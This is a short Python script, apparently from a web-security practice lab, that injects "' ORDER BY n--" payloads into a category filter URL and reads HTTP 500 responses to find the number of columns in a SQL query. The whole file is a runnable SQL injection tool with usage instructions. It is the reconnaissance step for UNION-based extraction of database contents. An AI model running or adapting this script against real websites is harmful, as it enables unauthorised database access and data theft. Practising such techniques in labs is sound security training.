#purpose: determine number of columns

import requests
import sys
import urllib3

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def find_num_col(url):
    path = "/filter?category=Gifts"
    for i in range(1, 50):
        payload = "' ORDER BY %s-- " %i
        r = requests.get(url + path + payload, verify = False)
        res = r.status_code

        if res == 500:
            return i-1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" %sys.argv[0])
        print("[-] Example: %s <www.example.com" %sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = find_num_col(url)
    if num_col:
        print("[+] Number of columns: " + str(num_col) +'.')
    else: 
        print("[-] SQL attack unseccessful.")
    